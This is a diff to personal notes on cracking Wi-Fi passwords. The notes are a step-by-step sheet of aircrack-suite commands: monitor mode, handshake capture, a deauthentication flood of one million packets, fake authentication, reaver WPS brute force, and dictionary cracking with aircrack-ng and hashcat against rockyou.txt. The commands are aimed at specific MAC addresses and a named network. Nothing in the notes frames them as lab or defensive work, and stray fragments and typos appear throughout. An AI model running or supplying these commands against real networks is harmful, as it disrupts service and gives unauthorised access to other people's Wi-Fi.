@@ -19,6 +19,8 @@ airodump-ng wlan0mon
 
 ---------------------- Start
 airmon-ng start wlan0mon
+OR
+airodump-ng wlan0
 
 ---------------------- Second Step
 airodump-ng wlan0mon
@@ -30,7 +32,7 @@ airodump-ng -c 10 --bssid 2
 ifconfig wlo1mon down
 iwconfig wlan0mon mode monitor
 ifconfig wlo1mon up
-
+wla
 
 
 sudo airmon-ng start wlan0
@@ -59,6 +61,23 @@ aircrack-ng -w rockyou.txt {Name}-01.cap
 
 
 
+
+---------------------- WPS Feature(if its avaiable)
+wash --interface wlan0mon
+aireplay-ng --fakeauth 30 -a A0:63:91:48:76:6B -h 00:C0:CA:B2:79:1B wlan0mon
+
+On second screen
+reaver --bssid A0:63:91:48:76:6B --channel 1 --interface wlan0mon -vvv --no-associate
+
+==============
+A0:63:91:48:76:6B
+1
+==============
+
+
+
+
+
 -------------------------------------------USING HACHCAT(if airmon did not work, faster)
 hashcat --help
 
@@ -67,7 +86,7 @@ WPA-EAPOL-PBKDF2
 
 (use different cap file, must convert it) - https://www.onlinehashcrack.com/tools-cap-to-hccapx-converter.php
 hashcat -a 0 -m 2500
-
+exo
 
 
 
@@ -106,6 +125,50 @@ WPA-EAPOL-PBKDF2
 
 (use different cap file, must convert it) - https://www.onlinehashcrack.com/tools-cap-to-hccapx-converter.php
 hashcat -a 0 -m 2500 {hccapx} rockyou.txt
+
+
+
+
+
+
+30:89:D3:2A:97:9E
+
+ZAID
+
+-To run specific and saving it in the file
+airodump-ng --bssid 30:89:D3:2A:97:9E --channel 6 --write name wlan0
+
+-Deauthenticate
+aireplay-ng --deauth 1000000 -a 30:89:D3:2A:97:9E -c 30:89:D3:2A:97:9E wlan0
+
+-Fake Authenticate
+airplay-ng --fakeauth 0 {MACADDRESS} -h {AdapterMACADDRESS}
+
+aireplay-ng -0 0 -a 30:89:D3:2A:97:9E wlan0mon
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ 
+
+
+
+
+
 
 
 
